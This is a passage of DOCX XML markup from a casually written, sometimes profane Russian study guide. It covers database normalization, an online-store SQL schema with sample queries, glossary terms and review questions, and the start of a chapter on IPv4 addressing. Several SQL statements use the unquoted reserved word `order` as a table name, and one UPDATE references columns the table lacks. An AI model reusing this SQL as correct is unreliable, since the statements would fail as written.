          <w:b/>
        </w:rPr>
        <w:t>Денормализованная версия:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total_price INT  -- Денормализация: дублируем данные</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При добавлении товара в заказ обновляем `total_price`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>UPDATE order</w:t>
        <w:br/>
        <w:t>SET total_price = total_price + (price * quantity)</w:t>
        <w:br/>
        <w:t>WHERE order_id = 123;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Быстрый запрос (не нужен JOIN и GROUP BY)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Надо следить за целостностью (использовать триггеры или код приложения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.7. SQL для создания нормализованной БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вот полный пример SQL-скрипта для интернет-магазина в 3НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица клиентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE customer (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    phone VARCHAR(20),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    registration_date DATE DEFAULT CURRENT_DATE</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица адресов (1:N с клиентом)</w:t>
        <w:br/>
        <w:t>CREATE TABLE address (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    address_id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    country VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    city VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    street VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    building VARCHAR(10),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    apartment VARCHAR(10),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    zip_code VARCHAR(10),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (customer_id) REFERENCES customer(customer_id)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ON DELETE CASCADE</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров</w:t>
        <w:br/>
        <w:t>CREATE TABLE item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    description TEXT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stock INT DEFAULT 0</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    address_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_date DATETIME DEFAULT CURRENT_TIMESTAMP,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    status ENUM('pending', 'paid', 'shipped', 'delivered', 'cancelled') DEFAULT 'pending',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (customer_id) REFERENCES customer(customer_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (address_id) REFERENCES address(address_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "заказ-товар" (M:N)</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT NOT NULL DEFAULT 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL,  -- Фиксируем цену на момент заказа</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (order_id) REFERENCES order(order_id)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (item_id) REFERENCES item(item_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Индексы для ускорения запросов</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_customer_email ON customer(email);</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_order_customer ON order(customer_id);</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_order_date ON order(order_date);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типичные запросы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- 1. Найти все заказы клиента ivan@mail.ru</w:t>
        <w:br/>
        <w:t>SELECT o.*</w:t>
        <w:br/>
        <w:t>FROM order o</w:t>
        <w:br/>
        <w:t>JOIN customer c ON o.customer_id = c.customer_id</w:t>
        <w:br/>
        <w:t>WHERE c.email = 'ivan@mail.ru';</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- 2. Найти общую стоимость заказа #123</w:t>
        <w:br/>
        <w:t>SELECT SUM(oi.price * oi.quantity) AS total</w:t>
        <w:br/>
        <w:t>FROM order_item oi</w:t>
        <w:br/>
        <w:t>WHERE oi.order_id = 123;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- 3. Найти топ-5 самых продаваемых товаров</w:t>
        <w:br/>
        <w:t>SELECT i.name, SUM(oi.quantity) AS total_sold</w:t>
        <w:br/>
        <w:t>FROM order_item oi</w:t>
        <w:br/>
        <w:t>JOIN item i ON oi.item_id = i.item_id</w:t>
        <w:br/>
        <w:t>GROUP BY i.item_id</w:t>
        <w:br/>
        <w:t>ORDER BY total_sold DESC</w:t>
        <w:br/>
        <w:t>LIMIT 5;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- 4. Найти клиентов, которые ничего не заказали</w:t>
        <w:br/>
        <w:t>SELECT c.*</w:t>
        <w:br/>
        <w:t>FROM customer c</w:t>
        <w:br/>
        <w:t>LEFT JOIN order o ON c.customer_id = o.customer_id</w:t>
        <w:br/>
        <w:t>WHERE o.order_id IS NULL;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.8. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.1 (Инфологическое моделирование):** ER-диаграммы → реляционные таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.2 (Архитектура БД):** Концептуальный уровень → Логический уровень (нормализация)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.1 (Жизненный цикл БД):** Нормализация происходит на этапе логического проектирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.01 (Алгоритмы):** Индексы используют B-деревья (O(log n))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.01 (Языки программирования):** SQL — декларативный язык 4-го поколения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реляционная модель данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — модель данных, основанная на представлении данных в виде таблиц (отношений).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отношение (Relation)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — таблица с данными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кортеж (Tuple)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — строка таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атрибут (Attribute)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — столбец таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Домен (Domain)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — множество допустимых значений атрибута.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Первичный ключ (Primary Key, PK)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут (или набор атрибутов), однозначно идентифицирующий строку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Внешний ключ (Foreign Key, FK)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут, ссылающийся на первичный ключ другой таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уникальный ключ (Unique Key, UK)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут с уникальными значениями, но не являющийся первичным ключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суррогатный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — искусственный идентификатор (обычно `id`), не несущий бизнес-смысла.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Естественный ключ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — атрибут с бизнес-смыслом, используемый как ключ (`email`, `ISBN`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — процесс организации данных для устранения избыточности и аномалий.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Первая нормальная форма (1НФ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — все атрибуты атомарны, нет повторяющихся групп.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вторая нормальная форма (2НФ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — находится в 1НФ, и каждый неключевой атрибут полностью зависит от первичного ключа (нет частичных зависимостей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Третья нормальная форма (3НФ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — находится в 2НФ, и нет транзитивных зависимостей неключевых атрибутов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормальная форма Бойса-Кодда (BCNF)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — усиленная 3НФ: для каждой зависимости X → Y атрибут X является суперключом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Транзитивная зависимость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — зависимость A → B → C, где C зависит от A через B.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аномалия обновления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — необходимость изменять дублированные данные во многих строках.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аномалия вставки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — невозможность добавить данные без добавления связанных данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аномалия удаления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — потеря данных при удалении строки из-за отсутствия отдельной таблицы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Денормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — сознательное нарушение нормальных форм для повышения производительности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Каскадное действие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — автоматическое изменение или удаление зависимых строк при изменении/удалении родительской строки (`ON DELETE CASCADE`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Что такое реляционная модель данных? Назовите её основные элементы (отношение, кортеж, атрибут, домен).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** В чём разница между первичным, внешним и уникальным ключами? Приведите примеры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Объясните проблемы ненормализованных данных. Что такое аномалии обновления, вставки и удаления?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нормализация:** Дана таблица:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   | student_id | student_name | course_name | instructor_name | grade |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   |------------|--------------|-------------|-----------------|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   | 1          | Иванов       | Математика  | Петров          | 5     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   | 1          | Иванов       | Физика      | Сидоров         | 4     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   | 2          | Петрова      | Математика  | Петров          | 4     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Приведите эту таблицу к 3НФ. Опишите, какие таблицы получатся.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Почему хранение списков через запятую (`"item1, item2, item3"`) в одном поле нарушает 1НФ? Как исправить?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** В чём разница между частичной и транзитивной зависимостью? Какая нормальная форма устраняет каждую из них?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Напишите SQL-запрос для создания двух таблиц: `author` (id, name) и `book` (id, title, author_id), с внешним ключом и каскадным удалением.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критическое мышление:** В каких случаях денормализация оправдана? Приведите пример.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт:** У вас таблица с 1 млн строк, где дублируется информация о клиенте (name, email, phone — 150 байт) в каждой строке. После нормализации клиенты хранятся в отдельной таблице (10,000 уникальных клиентов). Посчитайте экономию места.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Дизайн:** Спроектируйте БД для библиотеки в 3НФ. Должны быть сущности: книги, авторы, читатели, выдача книг. Опишите таблицы и связи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Молодец, если дочитал до сюда!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Теперь ты знаешь, как не нахуярить таблиц в БД, а сделать их правильно. Нормализация — это база основ реляционных баз данных. Без неё твоя БД превратится в свалку дублирующихся данных и багов. Удачи на экзамене! 🎉</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.1. Адресация Internet. Доменные имена. URL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Окей, дружище, мы уже с тобой прошли кучу всего: от двоичной системы до нормализации баз данных. Теперь пора разобраться, как вообще работает интернет. Нет, не в смысле "как создавать мемы" (это ты и сам умеешь), а как компьютеры находят друг друга в этой гигантской сети из миллиардов устройств.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь: ты вбиваешь в браузере `google.com`, жмёшь Enter, и — бац! — страница загрузилась. Но блять, как это работает? Твой компьютер не знает, где физически находится сервер Google. Ему нужен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. И вот тут начинается магия </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адресации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Domain Name System) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 1.11 (Системы счисления)** — IP-адреса в двоичной и шестнадцатеричной системах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 2.01 (Архитектура ЭВМ)** — адресация памяти vs адресация сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 3.01 (ОС)** — сетевой стек операционной системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Следующими главами раздела 8** — модель OSI, протоколы TCP/IP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1.1. IP-адресация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адрес (Internet Protocol address)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это уникальный числовой идентификатор устройства в сети. Типа как номер дома на улице. Только вместо "ул. Ленина, д. 10" у нас "192.168.1.1".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>IPv4: структура и запись</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPv4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это четвёртая версия протокола IP, которая используется с начала 1980-х годов (да, она старше тебя).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IP-адрес состоит из **4 октетов** (байтов), каждый от 0 до 255</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Записывается в **десятичной** нотации через точку: `192.168.0.1`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всего **32 бита** (4 байта × 8 бит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>192.168.0.1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В двоичном виде:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>11000000.10101000.00000000.00000001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество возможных адресов:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2³² = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4,294,967,296</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (примерно 4.3 миллиарда).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На Земле больше 8 миллиардов человек, и у многих по несколько устройств (компьютер, смартфон, умные часы, холодильник с Wi-Fi, хуй знает что ещё). IP-адресов </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не хватает</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Классы IP-адресов (классовая адресация)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Раньше (в 1980-х) IP-адреса делили на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классы</w:t>
      </w:r>
      <w:r>
        <w:t>. Это древняя схема, которую сейчас почти не используют, но на экзамене могут спросить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Класс | Диапазон первого октета | Маска сети       | Количество хостов | Для чего                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|-------------------------|------------------|-------------------|---------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| A     | 1 – 126                 | 255.0.0.0        | 16,777,214        | Огромные сети (Google)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| B     | 128 – 191               | 255.255.0.0      | 65,534            | Крупные организации       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C     | 192 – 223               | 255.255.255.0    | 254               | Малые сети (офисы)        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
